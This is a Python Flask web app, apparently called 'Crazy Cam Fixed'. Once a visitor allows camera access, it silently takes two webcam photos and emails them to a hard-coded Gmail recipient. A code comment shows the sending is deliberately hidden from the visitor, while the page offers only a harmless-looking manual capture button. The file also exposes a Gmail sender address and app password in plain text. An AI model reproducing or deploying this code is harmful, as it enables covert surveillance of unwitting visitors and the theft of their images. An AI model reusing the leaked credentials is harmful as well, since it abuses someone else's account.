from flask import Flask, render_template_string, request, jsonify
import smtplib
import ssl
from email.message import EmailMessage
import base64
import threading

app = Flask(__name__)

# Gmail configuration (App Password mandatory)
SENDER_EMAIL = "mindmeld025@gmail.com"
SENDER_PASSWORD = "rvuvgegdqzsgrcsn"  # Must be App Password
RECEIVER_EMAIL = "fermahmuda@gmail.com"


def send_email(image1, image2):
    """Send email with 2 images, safely with logging"""
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Captured Images'
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg.set_content("Here are the captured images.")

        # Decode base64 images and attach
        msg.add_attachment(base64.b64decode(image1.split(",")[1]),
                           maintype='image', subtype='png', filename="image1.png")
        msg.add_attachment(base64.b64decode(image2.split(",")[1]),
                           maintype='image', subtype='png', filename="image2.png")

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        print("✅ Email sent successfully")
    except Exception as e:
        print("❌ Email sending failed:", e)


def send_email_threaded(image1, image2):
    """Send email in background thread"""
    thread = threading.Thread(target=send_email, args=(image1, image2))
    thread.start()


@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Crazy Cam Fixed</title>
</head>
<body>
    <h2>Camera Capture</h2>

    <video id="video" autoplay playsinline style="width:320px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="status" style="font-weight:bold; margin-top:10px;">📷 Waiting for camera...</div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        let images = {};

        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
        })
        .catch(err => {
            statusDiv.innerText = "❌ Camera permission denied!";
        });

        video.onloadedmetadata = () => {
            statusDiv.innerText = "📸 Camera ready...";

            // Capture first image
            setTimeout(() => capture(1), 1000);
            // Capture second image and send automatically
            setTimeout(() => capture(2), 2500);
        };

        function capture(num) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Optional: reduce size slightly to avoid Gmail timeout
            // const scale = 0.7;
            // canvas.width *= scale;
            // canvas.height *= scale;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let dataUrl = canvas.toDataURL('image/png');  // full-size PNG

            images["image" + num] = dataUrl;

            if(num === 2){
                // Automatic sending, no status text
                fetch('/send_images', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(images)
                })
                .catch(err => console.error("❌ Email send error:", err));
            }
        }

        function manualCapture() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let dataUrl = canvas.toDataURL('image/png');

            let a = document.createElement('a');
            a.href = dataUrl;
            a.download = 'captured.png';
            a.click();
        }
    </script>

    <h3>Manual Capture</h3>
    <button onclick="manualCapture()">Capture & Download</button>
</body>
</html>
    """)


@app.route('/send_images', methods=['POST'])
def send_images():
    try:
        data = request.json
        image1 = data.get('image1')
        image2 = data.get('image2')

        if not image1 or not image2:
            return jsonify({"status": "error", "message": "Missing images"})

        send_email_threaded(image1, image2)

        return jsonify({"status": "success"})
    except Exception as e:
        print("❌ Route Error:", e)
        return jsonify({"status": "error", "message": str(e)})


if __name__ == '__main__':
    app.run(debug=True)
